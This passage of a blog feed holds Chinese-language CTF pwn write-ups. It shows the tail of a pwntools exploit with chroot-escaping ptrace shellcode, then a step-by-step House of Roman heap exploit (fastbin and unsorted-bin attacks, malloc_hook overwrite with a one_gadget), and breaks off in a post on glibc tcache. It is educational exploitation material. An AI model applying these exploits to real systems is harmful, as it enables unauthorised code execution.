rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi,rax</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rdx,0x4000</span></span><br><span class="line"><span class="string">    mov rax,rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">p.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass the chroot via ptrace</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xorr9d, r9d</span></span><br><span class="line"><span class="string">    xoredi, edi</span></span><br><span class="line"><span class="string">    mov r8d, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    movecx, 0x22</span></span><br><span class="line"><span class="string">    movedx, 3</span></span><br><span class="line"><span class="string">    movesi, 0x4000</span></span><br><span class="line"><span class="string">    mov rax, 0x440510</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string">    mov rbp,rax</span></span><br><span class="line"><span class="string">    add rax,0x3f00</span></span><br><span class="line"><span class="string">    mov rsp,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    mov al,110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r15,rax</span></span><br><span class="line"><span class="string">    mov rsi,rax</span></span><br><span class="line"><span class="string">    mov di,0x10</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    mov rdx,r10</span></span><br><span class="line"><span class="string">    call ptrace</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    mov rdi,r15</span></span><br><span class="line"><span class="string">    call wait</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    call getaddr</span></span><br><span class="line"><span class="string">    xor r12,r12</span></span><br><span class="line"><span class="string">    mov rbx,r12</span></span><br><span class="line"><span class="string">    mov rdx,0x43EFC0</span></span><br><span class="line"><span class="string">    mov r14,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">write:</span></span><br><span class="line"><span class="string">    mov rdi,5</span></span><br><span class="line"><span class="string">    mov r10,qword ptr [r14]</span></span><br><span class="line"><span class="string">    mov rsi,r15</span></span><br><span class="line"><span class="string">    call ptrace</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc r12</span></span><br><span class="line"><span class="string">    cmp r12,5</span></span><br><span class="line"><span class="string">    add rdx,8</span></span><br><span class="line"><span class="string">    add r14,8</span></span><br><span class="line"><span class="string">    jnz write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov di,17</span></span><br><span class="line"><span class="string">    mov rsi,r15</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov r10,rdx</span></span><br><span class="line"><span class="string">    call ptrace</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov al,60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">ptrace:</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    mov al,0x65</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wait:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor     r10d, r10d</span></span><br><span class="line"><span class="string">    movsxd  rdx, edx</span></span><br><span class="line"><span class="string">    movsxd  rdi, edi</span></span><br><span class="line"><span class="string">    mov     eax, 0x3D</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">getaddr:</span></span><br><span class="line"><span class="string">    lea rax,[rip+1]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">p.writeline(shellcode.ljust(<span class="number">0x4000</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interact()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> t3sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Roman</title>
      <link href="house_of_roman.html"/>
      <url>house_of_roman.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attachk 结合的一个小 trick。</p><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p><h2 id="原理以及展示"><a href="#原理以及展示" class="headerlink" title="原理以及展示"></a>原理以及展示</h2><p>作者提供给了我们一个 demo 用于展示，整个利用过程大概可以分为三步骤。</p><ol><li>将 FD 指向 malloc_hook</li><li>修正 0x71 的 Freelist</li><li>往 malloc_hook 写入 one gadget</li></ol><p>先对 demo 进行一个大致的分析：</p><p>开启的保护情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>样题中有三个主要功能，Malloc ，Write，以及 Free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    v5 = malloc_chunk(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    write_chunk(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">    free_chunk();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在 Free 功能中存在 指针未置零而造成的悬挂指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptrs[(<span class="keyword">unsigned</span> __int64)v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先伪造一个 chunk  ，chunk的大小为0x61。紧接着我们利用 partial overwrite 将 FD 指向伪造的chunk（当然，这里我们也可以用 UAF 完成）。</p><p>伪造 chunk size</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;</span><br><span class="line">0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757090: 0x41414141      0x41414141      0x61    0x0     &lt;----------</span><br></pre></td></tr></table></figure><p>这里，我们 free 掉 chunk 1，这个时候我们能获得一个 unsortbin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x555555757020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0xd1,</span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize &#x3D; 0x4141414141414141,</span><br><span class="line">  bk_nextsize &#x3D; 0x4141414141414141</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，我们重分配 0xd1 这块 chunk，以及修改其 size 为0x71</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40ag 0x555555757020</span><br><span class="line">0x555555757020: 0x4141414141414141      0x71</span><br><span class="line">0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;</span><br><span class="line">0x555555757040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757060: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757070: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757080: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757090: 0x4141414141414141      0x61</span><br></pre></td></tr></table></figure><p>我们紧接着需要修正这0x71 FD freelist ，将其伪造成已经释放的块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40ag 0x555555757000</span><br><span class="line">0x555555757000: 0x0     0x21</span><br><span class="line">0x555555757010: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757020: 0x4141414141414141      0x71       &lt;----------  free 0x71</span><br><span class="line">0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;</span><br><span class="line">0x555555757040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757060: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757070: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757080: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757090: 0x4141414141414141      0x61</span><br><span class="line">0x5555557570a0: 0x0     0x0</span><br><span class="line">0x5555557570b0: 0x0     0x0</span><br><span class="line">0x5555557570c0: 0x0     0x0</span><br><span class="line">0x5555557570d0: 0x0     0x0</span><br><span class="line">0x5555557570e0: 0x0     0x0</span><br><span class="line">0x5555557570f0: 0xd0    0x71   &lt;----------     free 0x71</span><br><span class="line">0x555555757100: 0x0     0x0</span><br><span class="line">0x555555757110: 0x0     0x0</span><br><span class="line">0x555555757120: 0x0     0x0</span><br><span class="line">0x555555757130: 0x0     0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)</span><br></pre></td></tr></table></figure><p>这个时候我们的 FD 已经在 malloc hook 附近，未之后的爆破做准备。</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们只需要通过 释放一块0x71大小的 chunk 就能完成 fix。</p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>利用 unsortebin 的攻击技巧，并使用编辑功能将 onegadet 写入    。</p><h2 id="分析-exp"><a href="#分析-exp" class="headerlink" title="分析 exp"></a>分析 exp</h2><p>分配 <code>3</code> 个 <code>chunk</code> ，在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;create 2 chunk, 0x20, 0xd8&quot;</span>)</span><br><span class="line">fake = <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">info(<span class="string">&quot;fake&quot;</span>)</span><br></pre></td></tr></table></figure><p>释放掉 <code>B</code> , 然后分配同样大小再次分配到 <code>B</code> , 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中有 <code>main_arean</code> 的地址。分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off by one</code> 修改 <code>B-&gt;size = 0x71</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">create(0xc8,1)</span><br><span class="line"></span><br><span class="line">create(0x65,3)  # b</span><br><span class="line">create(0x65,15)</span><br><span class="line">create(0x65,18)</span><br><span class="line"></span><br><span class="line">over &#x3D; &quot;A&quot;*0x18  # off by one</span><br><span class="line">over +&#x3D; &quot;\x71&quot;  # set chunk  1&#39;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span class="line">info(&quot;利用 off by one ,  chunk  1&#39;s size --&gt; 0x71&quot;)</span><br></pre></td></tr></table></figure><p>生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>B</code> 链入到 <code>fastbin</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">info(<span class="string">&quot;创建两个 0x70 的 fastbin&quot;</span>)</span><br><span class="line">heap_po = <span class="string">&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">info(<span class="string">&quot;把 chunk&#x27;1 链入到 fastbin 里面&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试看看此时 <code>fastbin</code> 的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><blockquote><p><code>0x555555757020</code> 就是 <code>chunk B</code></p></blockquote><p> 然后通过修改 <code>B-&gt;fd</code> 的低 <code>2</code> 字节， 使得 <code>B-&gt;fd= malloc_hook - 0x23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># malloc_hook 上方</span><br><span class="line">malloc_hook_nearly &#x3D; &quot;\xed\x1a&quot;</span><br><span class="line">edit(1,malloc_hook_nearly)</span><br><span class="line">info(&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code> 所在的那个 <code>chunk</code> .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(0x65,0)</span><br><span class="line">create(0x65,0)</span><br><span class="line">create(0x65,0)</span><br></pre></td></tr></table></figure><p>然后 <code>free</code> 掉 <code>E</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>E-&gt;fd = 0</code> ， 修复了 <code>fastbin</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br><span class="line">info(&quot;再次生成 0x71 的 fastbin, 同时修改 fd &#x3D;0, 修复 fastbin&quot;)</span><br></pre></td></tr></table></figure><p>然后是 unsorted bin 攻击，使得 malloc_hook 的值为 main_arena+88</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(0xc8,1)</span><br><span class="line">create(0xc8,1)</span><br><span class="line">create(0x18,2)</span><br><span class="line">create(0xc8,3)</span><br><span class="line">create(0xc8,4)</span><br><span class="line">free(1)</span><br><span class="line">po &#x3D; &quot;B&quot;*8</span><br><span class="line">po +&#x3D; &quot;\x00\x1b&quot;</span><br><span class="line">edit(1,po)</span><br><span class="line">create(0xc8,1)</span><br><span class="line">info(&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;)</span><br></pre></td></tr></table></figure><p>利用 修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">over &#x3D; &quot;R&quot;*0x13   # padding for malloc_hook</span><br><span class="line">over +&#x3D; &quot;\xa4\xd2\xaf&quot;</span><br><span class="line">edit(0,over)</span><br><span class="line"></span><br><span class="line">info(&quot;malloc_hook to one_gadget&quot;)</span><br></pre></td></tr></table></figure><p>然后 <code>free</code>  两次同一个  <code>chunk</code>  ，触发  <code>malloc_printerr</code>  ， <code>getshell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(18)</span><br><span class="line">free(18)</span><br></pre></td></tr></table></figure><h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><p><a href="https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a></p><p><a href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thread local caching in glibc malloc</title>
      <link href="thread-local-caching-in-glibc-malloc.html"/>
      <url>thread-local-caching-in-glibc-malloc.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="thread-local-caching-in-glibc-malloc"><a href="#thread-local-caching-in-glibc-malloc" class="headerlink" title="thread local caching in glibc malloc"></a>thread local caching in glibc malloc</h1><h2 id="TCACHE-2-26"><a href="#TCACHE-2-26" class="headerlink" title="TCACHE (2.26+)"></a>TCACHE (2.26+)</h2><p>Thread local storage caching</p><p>Singly linked list in chunk’s <code>fd</code> (sim. to FastBins)</p><p>All sizes</p><p>Major performance enhancement</p><p>Not even trying to be secured :/</p><p>在 glibc 2.26的版本中添加了一个新的机制，这个机制名字叫 <strong>tcache</strong> ，<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">从官网的概述来看</a>这是一个通过创建线程缓存一定大小的 chunk 用来提升性能。目前在 ubuntu 18.04 的发行版本中已经使用了这个机制。</p><h2 id="New-structures"><a href="#New-structures" class="headerlink" title="New structures"></a>New structures</h2><p>在这个新的机制中有两个新的结构体，<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l2927">tcache entry</a> 以及<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l2937">tcache_perthread_struct</a> 这两个都是很简单的结构。他们规定了一个 tcache 容器默认包含7个 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h2 id="tcahe-的使用"><a href="#tcahe-的使用" class="headerlink" title="tcahe 的使用"></a>tcahe 的使用</h2><p>Chunks can end up in the thread caches multiple ways:</p><ul><li>upon free: before the fastbin code in <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a>, if the chunk has an appropriate size and the corresponding bin isn’t full</li><li>upon malloc, there are 3 places where caches are filled<ul><li>if a fast chunk is returned, the other chunks from the corresponding fastbin are <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3588">used to fill the appropriate tcache bin</a>.</li><li><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3647">the same is done</a> if a small chunk is returned by malloc.</li><li><ul><li>in the binning code, exact size matches are first put in the tcache <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3780">instead of returning immediately</a>.</li></ul></li></ul></li></ul><p>Chunks are taken from the tcache:</p><ul><li>in <code>__libc_malloc</code>, <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3064">before _int_malloc</a>.</li><li><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3884">after the binning code</a>, if at least one exact match <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3784">was found</a>.</li><li>there can also be a limit 